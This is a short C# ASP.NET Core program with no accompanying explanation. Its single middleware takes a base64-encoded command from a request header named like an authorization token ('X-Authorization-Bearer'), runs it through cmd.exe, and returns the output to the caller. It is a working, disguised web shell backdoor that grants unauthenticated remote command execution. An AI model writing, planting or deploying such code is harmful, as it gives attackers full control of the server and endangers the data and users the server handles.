using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Http;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

app.Use(async (context, next) =>
{
    if (!context.Request.Headers.ContainsKey("X-Authorization-Bearer"))
    {
        await next();
        return;
    }

    string cmd = Encoding.UTF8.GetString(Convert.FromBase64String(context.Request.Headers["X-Authorization-Bearer"]));

    ProcessStartInfo psi = new ProcessStartInfo
    {
        FileName = "cmd.exe",
        Arguments = "/c " + cmd,
        RedirectStandardOutput = true,
        RedirectStandardError = true,
        UseShellExecute = false
    };

    Process process = Process.Start(psi);
    string output = await process.StandardOutput.ReadToEndAsync();
    output += await process.StandardError.ReadToEndAsync();
    process.WaitForExit();

    context.Response.ContentType = "text/plain";
    await context.Response.WriteAsync(output);
});

app.Run();